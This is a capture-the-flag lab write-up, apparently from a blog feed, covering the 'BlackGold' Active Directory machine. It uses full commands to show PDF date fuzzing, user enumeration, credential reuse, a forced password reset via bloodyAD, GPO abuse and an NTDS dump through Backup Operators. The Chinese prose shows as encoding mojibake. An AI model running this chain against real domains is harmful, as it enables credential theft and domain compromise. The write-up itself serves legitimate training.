-min-rate 10000 -p- 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:32 CST\nNmap scan report for 192.168.56.10\nHost is up (0.00066s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n65047/tcp open  unknown\n65051/tcp open  unknown\n65052/tcp open  unknown\n65062/tcp open  unknown\n65071/tcp open  unknown\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 26.45 seconds\n```\n\n```bash\nâœ  BlackGold nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:33 CST\nNmap scan report for 192.168.56.10\nHost is up (0.00038s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title:  Neptune\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 16:33:43Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n65047/tcp open  msrpc         Microsoft Windows RPC\n65051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n65052/tcp open  msrpc         Microsoft Windows RPC\n65062/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-07-14T16:34:35\n|_  start_date: N/A\n|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:31:d9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: -2s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.38 ms 192.168.56.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 111.63 seconds\n```\n\nè®¿é—® `HTTP` æœåŠ¡ï¼Œé€šè¿‡`IIS`æ­å»º\n\n![image.png](/post-images/TheHackersLabsBlackGold/image1.png)\n\nç›®å½•æ‰«æï¼Œæ²¡å‘ç°ä»€ä¹ˆå¯ç–‘çš„æ–‡ä»¶å¤¹\n\n```bash\nâœ  BlackGold gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 151] [--> http://192.168.56.10/images/]\n/docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/docs/]\n/Images               (Status: 301) [Size: 151] [--> http://192.168.56.10/Images/]\n/css                  (Status: 301) [Size: 148] [--> http://192.168.56.10/css/]\n/js                   (Status: 301) [Size: 147] [--> http://192.168.56.10/js/]\n/Docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/Docs/]\n/fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/fonts/]\n/IMAGES               (Status: 301) [Size: 151] [--> http://192.168.56.10/IMAGES/]\n/Fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/Fonts/]\n/CSS                  (Status: 301) [Size: 148] [--> http://192.168.56.10/CSS/]\n/JS                   (Status: 301) [Size: 147] [--> http://192.168.56.10/JS/]\n/DOCS                 (Status: 301) [Size: 149] [--> http://192.168.56.10/DOCS/]\nProgress: 661677 / 661680 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\né¡µé¢æ‹‰åˆ°ä¸‹é¢å¯ä»¥ä¸‹è½½ `PDF` æ–‡ä»¶\n\n![image.png](/post-images/TheHackersLabsBlackGold/image2.png)\n\nå›¾ç‰‡ä¸Šä¸¤ä¸ª`PDF`å†…å®¹éƒ½éƒ½æ˜¯æ— ç”¨çš„ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹`PDF`å…ƒä¿¡æ¯\n\n```bash\nâœ  BlackGold pdfinfo 2024-02-15.pdf \nTitle:           Certificado de Cumplimiento de Normativas Ambientales\nSubject:         \nKeywords:        \nAuthor:          James Clear\nCreator:         Neptune Oil & Gas\nProducer:        pdf-lib (https://github.com/Hopding/pdf-lib)\nCreationDate:    Thu Feb 15 11:00:00 2024 CST\nModDate:         \nCustom Metadata: no\nMetadata Stream: no\nTagged:          yes\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           2\nEncrypted:       no\nPage size:       596 x 842 pts (A4)\nPage rot:        0\nFile size:       58258 bytes\nOptimized:       no\nPDF version:     1.7\n\nâœ  BlackGold pdfinfo 2024-11-29.pdf \nTitle:           Informe de Sostenibilidad 2024\nSubject:         Informe sobre sostenibilidad y reducciÃ³n de emisiones de CO2\nKeywords:        \nAuthor:          David Brown\nCreator:         Neptune Oil & Gas\nProducer:        ReportLab PDF Library - www.reportlab.com\nCreationDate:    Thu Feb 27 06:07:22 2025 CST\nModDate:         Thu Feb 27 06:07:22 2025 CST\nCustom Metadata: no\nMetadata Stream: no\nTagged:          no\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           1\nEncrypted:       no\nPage size:       612 x 792 pts (letter)\nPage rot:        0\nFile size:       2110 bytes\nOptimized:       no\nPDF version:     1.5\n```\n\nä½œè€…ä¿¡æ¯ä¸­èƒ½å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·å`David.Brown` å’Œ `James.Clear` ï¼Œå¯èƒ½æ˜¯åŸŸç”¨æˆ·\n\n## **AS_REP Roasting âŒ**\n\nå¾—åˆ°ä¸¤ä¸ªç”¨æˆ·åï¼Œé¦–å…ˆå°è¯•ä¸€ä¸‹ ****`AS_REP Roasting`\n\n```bash\nâœ  BlackGold GetNPUsers.py -dc-ip 192.168.56.10 -dc-host neptune.thl nwptune.htl/ -usersfile users.txt\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)\n```\n\n## è·¯å¾„çˆ†ç ´\n\nè§‚å¯Ÿåˆ°ä¸‹è½½`PDF`çš„è·¯å¾„æ˜¯ï¼š`http://192.168.56.10/docs/2024-11-29.pdf`\n\næ˜¯æ ¹æ®æ—¥æœŸå‘½åï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹é€šè¿‡æ—¥æœŸçˆ†ç ´ä¸€ä¸‹\n\n![image.png](/post-images/TheHackersLabsBlackGold/image3.png)\n\næœ€åèƒ½çˆ†ç ´åˆ°`192`ä¸ª`PDF`æ–‡æ¡£\n\n![image.png](/post-images/TheHackersLabsBlackGold/image4.png)\n\nè¿™é‡Œä½¿ç”¨`yakit`æ— æ³•å¯¼å‡ºæ–‡ä»¶ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦å†™`python`è„šæœ¬æ¥çˆ†ç ´â€¦\n\n```bash\nimport requests\nimport datetime\nimport os\n\n# --- é…ç½® ---\nHOST = \"192.168.56.10\"\nPORT = 80  # æ ¹æ®éœ€è¦ä¿®æ”¹ HTTP ç«¯å£\nBASE_URL = f\"http://{HOST}:{PORT}\"\n\nSTART_YEAR = 2023\nEND_YEAR = 2024  # å®é™…ä¼šæ£€æŸ¥åˆ° 2025 å¹´\n\n# ä¿å­˜ä¸‹è½½æ–‡ä»¶çš„ç›®å½•å\nOUTPUT_DIR = \"found_pdfs\"\n\n# --- ä¸»é€»è¾‘ ---\ndef fuzz_and_download():\n    \"\"\"\n    éå†æŒ‡å®šæ—¥æœŸèŒƒå›´ï¼Œå°è¯•ä¸‹è½½ PDF æ–‡ä»¶ã€‚\n    å¦‚æœæœåŠ¡å™¨è¿”å› 200 çŠ¶æ€ç ï¼Œåˆ™å°†æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°ã€‚\n    \"\"\"\n    print(f\"[*] å¼€å§‹çˆ†ç ´ç›®æ ‡: {BASE_URL}\")\n    print(f\"[*] æ‰¾åˆ°çš„ PDF å°†ä¿å­˜åœ¨ ./{OUTPUT_DIR}/ ç›®å½•ä¸­\")\n\n    # 1. å¦‚æœè¾“å‡ºç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå®ƒ\n    if not os.path.exists(OUTPUT_DIR):\n        os.makedirs(OUTPUT_DIR)\n        print(f\"[*] å·²åˆ›å»ºç›®å½•: {OUTPUT_DIR}\")\n\n    found_files_count = 0\n\n    # 2. éå†æ‰€æœ‰å¯èƒ½çš„æ—¥æœŸ\n    for year in range(START_YEAR, END_YEAR + 1):\n        for month in range(1, 13):\n            for day in range(1, 32):\n                \n                # éªŒè¯æ—¥æœŸæ˜¯å¦æœ‰æ•ˆï¼Œè·³è¿‡å¦‚ 2æœˆ30æ—¥ ç­‰\n                try:\n                    datetime.date(year, month, day)\n                except ValueError:\n                    continue\n\n                # æ ¼å¼åŒ–æ—¥æœŸå’Œ URL\n                date_str = f\"{year}-{month:02d}-{day:02d}\"\n                filename = f\"{date_str}.pdf\"\n                url_path = f\"/docs/{filename}\"\n                full_url = f\"{BASE_URL}{url_path}\"\n\n                try:\n                    # æ‰“å°å•è¡Œè¿›åº¦æ¡ï¼Œend='\\r' è®©å…‰æ ‡å›åˆ°è¡Œé¦–ï¼Œå®ç°åŠ¨æ€æ›´æ–°\n                    print(f\"[*] æ­£åœ¨å°è¯•: {full_url}   \", end='\\r')\n\n                    # å‘é€è¯·æ±‚ï¼Œstream=True ç”¨äºä¸‹è½½å¤§æ–‡ä»¶ï¼Œä¸ä¼šä¸€æ¬¡æ€§è¯»å…¥å†…å­˜\n                    response = requests.get(full_url, timeout=5, stream=True)\n\n                    # 3. å¦‚æœçŠ¶æ€ç ä¸º 200ï¼Œåˆ™ä¿å­˜æ–‡ä»¶\n                    if response.status_code == 200:\n                        # æ‰“å°æˆåŠŸä¿¡æ¯ï¼ˆåœ¨æ–°çš„ä¸€è¡Œï¼Œé¿å…è¢«è¿›åº¦æ¡è¦†ç›–ï¼‰\n                        print(f\"\\n[+] æˆåŠŸ! æ‰¾åˆ°æ–‡ä»¶: {full_url} (çŠ¶æ€ç : 200)\")\n                        \n                        # å®šä¹‰æœ¬åœ°ä¿å­˜è·¯å¾„\n                        file_path = os.path.join(OUTPUT_DIR, filename)\n                        print(f\"    -> æ­£åœ¨ä¿å­˜åˆ°: {file_path}...\")\n\n                        # ä»¥äºŒè¿›åˆ¶å†™æ¨¡å¼ ('wb') æ‰“å¼€æ–‡ä»¶å¹¶å†™å…¥å†…å®¹\n                        with open(file_path, 'wb') as f:\n                            for chunk in response.iter_content(chunk_size=8192):\n                                f.write(chunk)\n                        \n                        found_files_count += 1\n\n                except requests.exceptions.RequestException as e:\n                    # å¦‚æœå‘ç”Ÿè¿æ¥é”™è¯¯ï¼Œæ‰“å°å‡ºæ¥\n                    print(f\"\\n[!] è¿æ¥é”™è¯¯: {full_url} - {e}\")\n    \n    # 4. ç»“æŸæ—¶æ‰“å°æ€»ç»“\n    print(\"\\n\\n[*] çˆ†ç ´å®Œæˆã€‚\")\n    if found_files_count > 0:\n        print(f\"[*] å…±ä¸‹è½½äº† {found_files_count} ä¸ª PDF æ–‡ä»¶åˆ° '{OUTPUT_DIR}' ç›®å½•ã€‚\")\n    else:\n        print(\"[*] æœªæ‰¾åˆ°ä»»ä½•å¯ç”¨çš„æ–‡ä»¶ã€‚\")\n\nif __name__ == \"__main__\":\n    fuzz_and_download()\n```\n\n## ç”¨æˆ·æšä¸¾\n\nå°†ä½œè€… `author` å’Œ `Creator` ä¿¡æ¯æˆªå–å‡ºæ¥\n\n```bash\nexiftool PDF/found_pdfs/* | grep -E 'Author|Creator' | grep -v 'Neptune Oil & Gas' | cut -d: -f 2 | sed 's/^ *//' | sort | uniq > users.txt\n```\n\nä½¿ç”¨`kerbrute` æšä¸¾\n\n```bash\nâœ  BlackGold kerbrute -users users.txt -domain neptune.thl -dc-ip 192.168.56.10\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Valid user => Lucas.Miller\n[*] No passwords were discovered :'(\n```\n\næ‰¾åˆ°ç”¨æˆ·å`Lucas.Miller`\n\n å†å°è¯•ä¸€ä¸‹å†`PDF`æ–‡ä»¶ä¸­è¯»å–æœ‰å…³`Lucas.Miller` çš„\n\n```bash\nâœ  BlackGold pdfgrep -i 'Lucas.Miller' PDF/found_pdfs/*     \nPDF/found_pdfs/2023-01-12.pdf:Estimado Lucas Miller,\nPDF/found_pdfs/2023-01-12.pdf:   â— Nombre de usuario (Usuario AD): lucas.miller@neptune.thl\n```\n\n![image.png](/post-images/TheHackersLabsBlackGold/image5.png)\n\nå¾—åˆ°ä¸€ä¸²å¯†ç  `E@6q%TnR7UEQSXywr8^@`\n\næµ‹è¯•å‡­æ®æ˜¯å¦æœ‰æ•ˆ\n\n```bash\nâœ  BlackGold nxc smb neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n\nâœ  BlackGold nxc ldap neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'\nLDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\nLDAP        192.168.56.10   389    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n```\n\n## åŸŸåˆ†æ\n\nä¸Š `BloodHound` åˆ†æä¸€æ³¢\n\n```bash\nâœ  BlackGold bloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@' \nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: neptune.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 8 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.neptune.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250715122943_bloodhound.zip\n```\n\n`users` ç»„\n\n![image.png](/post-images/TheHackersLabsBlackGold/image6.png)\n\nè§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œç”¨æˆ·`Victor Rodriguez` çš„å¯†ç å†™åœ¨äº†`Description` ä¸Š\n\n![image.png](/post-images/TheHackersLabsBlackGold/image7.png)\n\nå¹¶ä¸”å…¶å±äº`IT`ç»„ï¼Œåœ¨`SMB`ä¸­æœ‰ä¸€ä¸ª`IT`çš„å…±äº«æ–‡ä»¶å¤¹\n\n![image.png](/post-images/TheHackersLabsBlackGold/image8.png)\n\nè¿œç¨‹ç®¡ç†ç»„ç”¨æˆ·æœ‰ä¸¤ä¸ªï¼Œæš‚æ—¶æ˜¯æ¨ªå‘ç›®æ ‡\n\n![image.png](/post-images/TheHackersLabsBlackGold/image9.png)\n\n## æ¨ªå‘ç§»åŠ¨\n\n### To emma.johnson\n\næµ‹è¯•ä¸Šé¢çš„å‡­æ®\n\n```bash\nâœ  BlackGold nxc smb neptune.thl -u 'Victor.Rodriguez' -p 'H5gVCzzZkzJ#wGsT8u1$'\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Victor.Rodriguez:H5gVCzzZkzJ#wGsT8u1$\n```\n\n`SMB`é‡Œé¢èƒ½å¾—åˆ°ä¸€ä¸ª`powershell`è„šæœ¬\n\n```bash\nâœ  BlackGold smbclient //192.168.56.10/IT -U neptune.thl/Victor.Rodriguez%'H5gVCzzZkzJ#wGsT8u1$'            \nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Thu Feb 27 08:14:40 2025\n  ..                                DHS        0  Fri Feb 28 03:52:00 2025\n  Scripts                             D        0  Thu Feb 27 08:16:55 2025\n\n                10540543 blocks of size 4096. 7161242 blocks available\nsmb: \\> cd Scripts\\\nsmb: \\Scripts\\> ls\n  .                                   D        0  Thu Feb 27 08:16:55 2025\n  ..                                  D        0  Thu Feb 27 08:14:40 2025\n  backup.ps1                          A     1957  Thu Feb 27 08:20:11 2025\n\n                10540543 blocks of size 4096. 7161244 blocks available\nsmb: \\Scripts\\> get backup.ps1 \ngetting file \\Scripts\\backup.ps1 of size 1957 as backup.ps1 (382.2 KiloBytes/sec) (average 382.2 KiloBytes/sec)\n```\n\næ‰“å¼€åèƒ½å¾—åˆ°ç”¨æˆ·`emma.johnson` çš„å‡­æ®ï¼Œå¯†ç ï¼š`sb9TVndq8N@tUVMmP2@#`\n\n![image.png](/post-images/TheHackersLabsBlackGold/image10.png)\n\n`emma.johnson` æ˜¯æˆ‘ä»¬åœ¨ä¸Šé¢çœ‹åˆ°åœ¨è¿œç¨‹ç®¡ç†ç»„é‡Œé¢çš„ç”¨æˆ·\n\n```bash\nâœ  BlackGold nxc winrm neptune.thl -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'\nWINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.10   5985   DC01             [+] neptune.thl\\emma.johnson:sb9TVndq8N@tUVMmP2@# (Pwn3d!)\n```\n\n![image.png](/post-images/TheHackersLabsBlackGold/image11.png)\n\nè¯¥ç”¨æˆ·èƒ½å¾—åˆ° `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Emma Johnson\\Desktop> type user.txt\na5xxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n### To thomas.brown\n\nå½“å‰ç”¨æˆ·æƒé™\n\n![image.png](/post-images/TheHackersLabsBlackGold/image12.png)\n\nä¸‹ä¸€ä¸ªç”¨æˆ·åŒ…æ˜¯`Thomas Brown` ï¼Œå› ä¸ºä»–å±äº`BACKUP OPERATORS`\n\n![image.png](/post-images/TheHackersLabsBlackGold/image13.png)\n\né‡æ–°å¯¼å…¥ä¸‹`BloodHound`çš„æ•°æ®\n\n```bash\n\tbloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'\n```\n\n### GPO æ»¥ç”¨ **âŒ**\n\nèƒ½çœ‹åˆ°`emma.johnson` æœ‰æ–°çš„æƒé™\n\n![image.png](/post-images/TheHackersLabsBlackGold/image14.png)\n\nè¯¥ç»„ç­–ç•¥å½±å“å¾ˆå¤šç”¨æˆ·\n\n![image.png](/post-images/TheHackersLabsBlackGold/image15.png)\n\nä½¿ç”¨`bloodyAD`æ¥å®ç°\n\nèµ‹äºˆ`emma.johnson`è‡ªå·±æ‹¥æœ‰å¯¹è¯¥ `GPO` çš„ `genericAll` æƒé™\n\n```bash\nâœ  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' add genericAll 'CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL' 'emma.johnson'\n[+] emma.johnson has now GenericAll on CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL\n```\n\nè¿™é‡Œå¾ˆå¥‡æ€ªï¼Œè¿™é‡Œä½¿ç”¨äº†å¥½å‡ ä¸ªå·¥å…·ä¹Ÿæ— æ³•åˆ©ç”¨\n\n```bash\npython3 GPOwned.py -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' -d 'neptune.thl' -dc-ip '192.168.56.10' -gpcmachine -gpoimmtask -name '{037ECEDE-7C98-4D00-95D5-4283F4271B0D}' -author 'neptune.thl\\Administrador' -taskname 'Beautiful IOC' -taskdescription 'Hello World' -dstpath 'c:\\windows\\system32\\calc.exe'\n```\n\n![image.png](/post-images/TheHackersLabsBlackGold/image16.png)\n\næœ€åçœ‹äº†`WP`å‘ç°äººå®¶çš„å’Œæˆ‘ä¸ä¸€æ ·\n\n### Force Change PassWord\n\nè¿™é‡Œé‡æ–°å¯¼å…¥äº†ä¸€ä¸‹æœºå™¨ï¼Œç„¶åå†æ¬¡å¯¼å…¥æ–°çš„æ•°æ®ï¼Œå°±å¯ä»¥çœ‹åˆ°`emma.johnson`å¯ä»¥ä¿®æ”¹`thomas`çš„å¯†ç \n\n![image.png](/post-images/TheHackersLabsBlackGold/image17.png)\n\né€šè¿‡ `BloodAD`ä¿®æ”¹å¯†ç \n\n```bash\nâœ  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' set password thomas.brown Admin@123\n[+] Password changed successfully!\n```\n\nç™»å½•`thomas.brown`è´¦æˆ·\n\n![image.png](/post-images/TheHackersLabsBlackGold/image18.png)\n\n### è½¬å‚¨ NTDS\n\nä¸Šé¢æˆ‘ä»¬å°±çŸ¥é“`thomas.brown` å±äº`BACKUP OPERATORS` ç»„\n\n`whoami`ä¿¡æ¯ä¸­ä¹Ÿèƒ½çœ‹å‡ºæ¥\n\n![image.png](/post-images/TheHackersLabsBlackGold/image19.png)\n\nåˆ©ç”¨ï¼šhttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe\n\nå› ä¸º`winrm`æ˜¯éäº¤äº’ä¼šè¯ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œä¿®æ”¹\n\n```bash\necho \"set context persistent nowriters\" > C:\\Windows\\Temp\\ntds_shadow.txt\necho \"add volume C: alias shadow_c\" >> C:\\Windows\\Temp\\ntds_shadow.txt\necho \"create\" >> C:\\Windows\\Temp\\ntds_shadow.txt\necho \"expose %shadow_c% Z:\" >> C:\\Windows\\Temp\\ntds_shadow.txt\ndiskshadow /s C:\\Windows\\Temp\\ntds_shadow.txt\n```\n\n```bash\nrobocopy /B Z:\\Windows\\NTDS\\ C:\\rev ntds.dit\nrobocopy /B Z:\\Windows\\System32\\config\\ C:\\rev SYSTEM\n```\n\nå†é€šè¿‡ `secretdump` è½¬å‚¨å‡ºæ¥\n\n![image.png](/post-images/TheHackersLabsBlackGold/image20.png)\n\n## æ€»ç»“\n\nå¸¸è§„æ€è·¯ï¼Œé™¤äº†æœ‰äº›å‘",
            "url": "https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold",
            "title": "TheHackersLabs - BlackGold",
            "summary": "BlackGold https://labs.thehackerslabs.com/machine/9 Recon ç«¯å£æ‰«æ è®¿é—® HTTP æœåŠ¡ï¼Œé€šè¿‡IISæ­å»º ç›®å½•æ‰«æï¼Œæ²¡å‘ç°ä»€ä¹ˆå¯ç–‘çš„æ–‡ä»¶å¤¹ é¡µé¢æ‹‰åˆ°ä¸‹é¢å¯ä»¥ä¸‹è½½ PDF æ–‡ä»¶ å›¾ç‰‡ä¸Šä¸¤ä¸ªPDFå†…å®¹éƒ½éƒ½æ˜¯æ— ç”¨çš„ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹PDFå…ƒä¿¡æ¯ ä½œè€…ä¿¡...",
            "date_modified": "2025-07-15T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "NTDS",
                "exiftool",
                "Domain",
                "AD"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition",
            "content_html": "\n# Sedition\n\n> https://labs.thehackerslabs.com/machine/117\n> \n\n![image.png](/post-images/TheHackersLabsSedition/image.png)\n\n## Recon\n\n```bash\nâœ  Sedition nmap -sT -min-rate 10000 192.168.56.87      \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:30 CST\nNmap scan report for 192.168.56.87\nHost is up (0.0037s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.32 seconds\n```\n\næ‰«æå‡ºæ¥æ˜¯éå¸¸è§„ç«¯å£\n\n```bash\nâœ  Sedition nmap -sT -A -p 139,445 192.168.56.87        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:34 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00049s latency).\n\nPORT    STATE SERVICE     VERSION\n139/tcp open  netbios-ssn Samba smbd 4\n445/tcp open  netbios-ssn Samba smbd 4\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\n\nHost script results:\n|_clock-skew: -3s\n| smb2-time: \n|   date: 2025-07-14T13:34:54\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.49 ms 192.168.56.87\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.50 seconds\n```\n\næ²¡æœ‰`Web`ç«¯å£ï¼Œæˆ‘ä»¬åªèƒ½ä»`SMB`ä¸Šæ‰‹\n\né¦–å…ˆå°è¯•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—®\n\n```bash\nâœ  Sedition smbclient -L 192.168.56.87 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        backup          Disk      \n        IPC$            IPC       IPC Service (Samba Server)\n        nobody          Disk      Home Directories\nReconnecting with SMB1 for workgroup listing.\nsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\nProtocol 